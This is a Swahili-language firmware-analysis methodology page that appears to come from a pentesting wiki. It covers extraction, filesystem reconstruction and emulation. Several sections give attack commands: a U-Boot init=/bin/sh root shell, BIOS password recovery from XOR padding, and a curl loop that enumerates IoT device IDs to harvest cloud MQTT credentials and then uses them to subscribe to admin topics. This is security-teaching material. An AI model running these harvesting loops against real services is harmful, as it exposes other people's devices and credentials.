# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa kupata firmware kupitia interfaces za hardware zilizo wazi, angalia [kutupa firmware kwa kutumia console ya UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [kutupa SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kurahisisha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, hivyo kifaa kinaweza kufikia maagizo muhimu mara tu kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo mahususi ya bootloader
- Muundo wa hardware na datasheet
- Vipimo vya codebase na maeneo ya source code
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchanganuzi wa vipengele vyovyote vya open-source vinavyopatikana kupitia michakato ya ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure inayoweza kutumiwa kutafuta matatizo yanayoweza kutokea.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kutumia maelekezo yaliyotolewa
- **Kuipakua** kutoka tovuti rasmi za usaidizi
- Kutumia utafutaji wa **Google dork** ili kupata faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kunasa **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kunasa** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kuitupa** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, mbinu nyingine zikishindikana, kwa kutumia zana zinazofaa za hardware

### Kumbukumbu za UART pekee: lazimisha root shell kupitia U-Boot env kwenye flash

Ikiwa UART RX haitoambii (kumbukumbu pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** ukiwa nje ya kifaa:<sup>[[6]](#references)</sup>

1. Tupa SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta kizigeu cha env cha U-Boot, hariri `bootargs` ili ijumuishwe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Andika upya kizigeu cha env pekee kisha uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini kizigeu cha env kinaweza kuandikwa kupitia ufikiaji wa flash ya nje.

## Kuchanganua firmware

Sasa kwa kuwa **unayo firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuichunguza. Kuna zana tofauti unazoweza kutumia kufanya hivyo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ukipata matokeo machache kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au tumia [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Uchambuzi linganishi wa flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Wakati mpangilio wa firmware hauna fomati ya uhifadhi iliyoandikwa, kwanza soma flash inayolingana mara kadhaa, badilisha mpangilio **mmoja tu**, hifadhi nakala ya chip nzima tena, kisha linganisha offsets. Kurudia jaribio hilo kwa thamani zinazodhibitiwa hutofautisha mpangilio huo na counters pamoja na metadata ya uandishi; mabadiliko kwenye offsets mpya badala ya sehemu ileile huashiria hifadhi ya append-only au iliyopangwa kama log. Hifadhi maingizo yaliyofutwa/yaliyowekwa alama kuwa yameondolewa kwa sababu bytes za payload zake bado zinaweza kurejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa firmware modules kwa kutumia tools kama `binwalk` na ufanye reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, upangaji wa key index, na uundaji wa key kwenye code badala ya kukisia scheme kwa kutegemea tu mifumo ya ciphertext.<sup>[[12]](#references)</sup>

#### Pata keys kutoka kwenye zero padding iliyosimbwa

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua keystream bytes kwenye offsets zilezile. Field yenye ukubwa usiobadilika huwa hatarini hasa wakati zero padding yake inafunika kila index ya repeating XOR key: padding iliyosimbwa hufichua key bytes hizo moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila key index imefunikwa, jenga upya key kutoka kwenye mwisho wa ciphertext kisha decrypt bytes zilizo na data.<sup>[[12]](#references)</sup>

Muundo wa DVAR BIOS-password wa Dell ulio hatarini ni mfano halisi: byte `0` ya field ya bytes 32 iko wazi, huku bytes `1..31` zikitumia repeating key yenye urefu wa bytes 20.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nenosiri `L`, nafasi za `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila faharasa ya key, hivyo key kamili na nenosiri hupatikana bila kutumia brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takriban kama `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea nenosiri ni byte ya kwanza iliyo wazi. Hii hutoa hadi funguo 256 kwa kila kifaa na kusababisha rekodi zinazoanza kwa byte ileile kutumia ufunguo mmoja. Panga rekodi zinazotumika na zilizofutwa kulingana na byte hiyo; rekodi fupi ya kihistoria inaweza leak ufunguo mzima kupitia padding na kusimbua rekodi ndefu ya sasa ambayo padding yake yenyewe haitoshi. Kwa hiyo, password rotation inaweza kuongeza hatari pale ciphertext ya zamani inapowekwa tombstoned badala ya kufutwa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hupata DVAR, huthibitisha rekodi zinazowezekana, hurejesha nywila, na inaweza kuonyesha byte ghafi zilizohifadhiwa/za ufunguo. Ijenge kutoka kwenye checkout na uchanganue image ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa false positives kwa kutumia muundo wa rekodi, masharti ya herufi zinazochapishika, ukaguzi wa zero-padding, entropy ya key, na uthabiti mahali ambapo key inajizungusha. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya biti kwa kila write, orodhesha masks zilizozingatiwa na panga marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi kabisa.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya ciphertext inayoweza kurejeshwa, na log-structured stores zinapaswa kuondoa kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Kwa kutumia tools zilizotajwa awali, kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kwa kawaida huitoa ndani ya **folder iliyopewa jina la aina ya filesystem**, ambayo kwa kawaida ni mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem kwa Mkono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem katika signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na kuchonga filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kufanya carving ya mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kujenga upya mifumo ya faili ya root iliyogawanywa

Ikiwa nakala ghafi ya eMMC/SSD ina kichwa halali cha mfumo wa faili lakini offsets za metadata yake zinaishia nje ya partition ya kawaida, usiihesabu mara moja kuwa imeharibika. Boot code iliyopachikwa inaweza kuunda kifaa halisi cha root kutoka kwenye masafa mengi ya kimwili kwa kutumia Device Mapper, hivyo kuchukua data kutoka kwenye partition moja ya GPT hutoa sehemu ya kwanza pekee.<sup>[[9]](#references)</sup>

#### Kupitia haraka picha kamili ya media

Kwanza hakikisha kuwa upataji umekamilika, ukubwa ni thabiti, na hakuna mchakato unaoandika kwenye picha hiyo. Ikiwa jina la faili lina anwani ya mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya byte. Rejesha GPT katika hali ya kusoma pekee na uambatishe masafa yanayohitajika tu; **usiendeshe `vgchange -ay` dhidi ya physical volume isiyoaminika kwenye workstation kwa sababu migongano ya volume group na uandishi usiokusudiwa unaweza kutokea.**<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea kutumia VM inayoweza kutupwa pale ambapo logic ya awali ya init au stack ya LVM inahitaji kuona image nzima. Rekodi za zamani za boot kutoka kwenye partition ya kawaida ya boot ni muhimu sana: bootloader huenda iliandika offsets za proprietary-container, urefu wa component, uteuzi wa slot, sheria za alignment na uthibitishaji wa signature. Tumia thamani hizo kukata command line/kernel/initramfs iliyopachikwa, kisha uthibitishe kila output kivyake kwa `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuambatisha initrd, object ya ACPI au signature kwenye kernel kimakosa.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na ufanye reverse engineering ya `/init` pamoja na maktaba zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeo ya string za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` na njia za partition; kisha fuatilia code inayochagua slot amilifu ya A/B na kuunda table. Sehemu nzuri za kuanzia katika radare2 ni `r2 -A init`, `afl`, `pdf @ main` na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Target ya linear huweka ramani ya safu mfululizo za kifaa pepe kwenye safu za kifaa kimoja au zaidi za backing. Table iliyorejeshwa yenye segment mbili mara nyingi huwa na umbo hili (nafasi na urefu wote ni sektori za baiti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code kwa usahihi kabisa, ikijumuisha upana wa integer, shifts na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao huzungusha ukubwa wa byte kwenda chini hadi kwenye mpaka wa 4-KiB, kisha tu huubadilisha kuwa sectors za 512-byte; kuubadilisha na `p4_bytes // 512` huhamisha tail iliyochaguliwa kwa `p4_bytes % 4096` kila partition isipokuwa imepangiliwa kwa ukurasa.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tengeneza upya image tambarare ya uchanganuzi kwa kunakili masafa kwa mpangilio wa jedwali, ukitumia chunks zenye ukubwa usiozidi kikomo badala ya kupakia media dump nzima kwenye memory. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Hifadhi offsets zilizotokana na GPT, idadi ya sekta zilizogeuzwa, na urefu wa output unaotokana navyo kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu wa data na hitilafu ya mara kwa mara ya ujenzi upya

Kwa SquashFS, kagua magic ya `hsqs` na usome thamani ya `bytes_used` ya 64-bit ya little-endian kwenye offset 40 ya superblock kabla ya kutumia `unsquashfs`. Ikiwa uchimbuaji utashindwa katika miundo kadhaa isiyohusiana, tafuta kwenye dirisha pana linalozunguka nafasi zilizotarajiwa na uhakikishe kuwa kuna wagombeaji thabiti wa kimuundo: metadata block inayoweza kutolewa kwa compression, directory entries kadhaa halali zinazofuatana, sehemu za inode zinazokubalika, root inode inayolingana na idadi ya inode, au muundo halali wa integrity metadata. Kulingana na ulinganifu mmoja tu wa magic haitoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile iliyosainiwa inapofanya miundo huru iwe halali—kwa mfano, metadata ya directory na rekodi ya verity—sababu inayowezekana ni hitilafu ya kimfumo ya mwanzo wa segment, badala ya kukosekana kwa bytes. Rudi kwenye hesabu iliyo kinyume na uchunguze remainders zilizotupwa, signedness, overflow, au rounding ya sector/page kabla ya kujaribu kurejesha data iliyotengwa au kurekebisha metadata ya filesystem.<sup>[[9]](#references)</sup>

Hatimaye, weka mipaka ya ulinzi tofauti: volumes za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyosainiwa hulinda uadilifu wa root-filesystem. TPM ya software haiwezi kurejesha key iliyofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya utafiti pekee inayoacha uthibitishaji wa verity hakubuni sahihi yake wala kuvunja dm-verity.<sup>[[9]](#references)</sup>

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa kina ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye image ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ajili ya ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partitions na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, **entropy** hukaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria usimbaji fiche au ukandamizaji unaowezekana.

Kwa kutoa **embedded files**, zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** za kukagua faili zinapendekezwa.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye saraka iliyopewa jina la aina ya mfumo wa faili (k.m., squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu ya kukosekana kwa magic bytes, uchimbaji wa mikono unahitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia amri ya `dd` kuichonga mfumo wa faili:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya mfumo wa faili (k.m., squashfs, cpio, jffs2, ubifs), hutumika amri tofauti kutoa maudhui kwa mikono.

### Uchambuzi wa Mfumo wa Faili

Baada ya kutoa mfumo wa faili, utafutaji wa dosari za usalama huanza. Huchunguzwa daemoni za mtandao zisizo salama, vitambulisho vilivyowekwa moja kwa moja kwenye msimbo, endpoint za API, utendaji wa seva ya masasisho, msimbo ambao haujakompailiwa, hati za uanzishaji, na binary zilizokompailiwa kwa ajili ya uchambuzi nje ya kifaa.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya vitambulisho vya watumiaji
- Vyeti na funguo za SSL katika **etc/ssl**
- Faili za usanidi na hati ili kutafuta uwezekano wa udhaifu
- Binary zilizopachikwa kwa ajili ya uchambuzi zaidi
- Seva za wavuti na binary za kawaida za vifaa vya IoT

Zana kadhaa husaidia kugundua taarifa nyeti na udhaifu ndani ya mfumo wa faili:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi tuli na wa nguvu

### Ukaguzi wa Usalama wa Binary Zilizokompailiwa

Msimbo chanzo na binary zilizokompailiwa zinazopatikana kwenye mfumo wa faili lazima zichunguzwe kwa makini ili kubaini udhaifu. Zana kama **checksec.sh** kwa binary za Unix na **PESecurity** kwa binary za Windows husaidia kutambua binary zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kukusanya usanidi wa cloud na vitambulisho vya MQTT kupitia tokeni za URL zinazotokana na data nyingine

Hub nyingi za IoT hupata usanidi wa kila kifaa kutoka endpoint ya cloud inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa kuchanganua firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia siri iliyowekwa moja kwa moja kwenye msimbo, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu humwezesha yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata usanidi wa cloud, ambao mara nyingi hufichua vitambulisho vya MQTT vilivyo katika maandishi ya kawaida na viambishi awali vya mada.

Mtiririko wa kazi wa vitendo:

1) Toa deviceId kutoka kwenye kumbukumbu za uanzishaji za UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa kumbukumbu:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na ubadilishe digest iwe herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya cloud config na credentials za MQTT

- Tengeneza URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa siri:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya maandishi wazi na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana kujiunga na maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha byte za OUI ya vendor/bidhaa/aina, zikifuatiwa na kiambishi tamati kinachofuatana kwa mpangilio.
- Unaweza kujaribu IDs zinazowezekana, kuzalisha tokens na kupata configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila mara kabla ya kujaribu kufanya enumeration kwa wingi.
- Inapowezekana, pendelea emulation au static analysis ili kurejesha siri bila kurekebisha hardware lengwa.

Mchakato wa kufanya emulation ya firmware huwezesha **dynamic analysis** ya utendaji wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na utegemezi wa hardware au architecture, lakini kuhamisha root filesystem au binaries mahususi hadi kwenye kifaa chenye architecture na endianness zinazolingana, kama vile Raspberry Pi, au kwenye virtual machine iliyoundwa mapema, kunaweza kurahisisha majaribio zaidi.

### Kufanya Emulation ya Binaries Mahususi

Unapochunguza programu moja moja, ni muhimu kutambua endianness na architecture ya CPU ya programu hiyo.

#### Mfano wa MIPS Architecture

Ili kufanya emulation ya binary ya MIPS architecture, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na ili kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binary za little-endian, `qemu-mipsel` ndiyo chaguo.

#### Uigaji wa ARM Architecture

Kwa binary za ARM, mchakato unafanana, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha uigaji kamili wa firmware, huendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

### Kuunda upya root filesystem zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inaweza kusomeka lakini offsets za inode, directory, au fragment table haziwezekani, usirekebishe `unsquashfs` mara moja. Fanya reverse engineering ya early boot binary na uunde upya grafu ya block device inayoundwa nayo: mifumo iliyopachikwa inaweza kuonyesha partition ya root ya kawaida lakini kwa hakika huunda filesystem kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila metadata block inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware jinsi zilivyo hasa. Hasa, tambua kama urefu ni bytes, sectors za baiti 512, au pages za 4 KiB; rudia shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata thamani hadi mpaka wa 4 KiB, kisha huonyesha matokeo katika sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza extent iliyoongezwa kwa kilobytes chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata kifaa chanzo, sector ya kuanzia, na urefu wa kila segment ya `dm-linear` kutoka kwenye binary ya verifier/init.
2. Unganisha au map extents bila kubadilisha kanuni zake za alignment.
3. Ikiwa extraction bado inashindwa, tafuta katika eneo dogo tu karibu na mpaka uliotabiriwa, na dai kuwepo kwa metadata structures kadhaa mfululizo zilizo halali badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Tumia `unsquashfs` ambayo haijarekebishwa kwenye image iliyoundwa upya; kufanikiwa kupitia directory na fragment zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Kubadilisha dm-verity chini ya udhibiti wa analyst

Wakati analyst anadhibiti kernel ya QEMU, initramfs, na virtual disks, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa boot-chain wa maabara**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot, au key iliyofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, ita `setsid()`, unganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, subiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma pekee, detach pseudo-filesystem za old-root, hamisha mount mpya hadi `/`, fanya `chroot`, kisha `execve()` `/sbin/init` ya awali ya firmware. Ku-detach `/dev`, `/proc`, na `/sys` **kabla** ya `MS_MOVE` huzuia kwa bahati mbaya ku-detach mount points za root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root iliyorekebishwa isiyobadilika. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asili, huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image nje ya mtandao

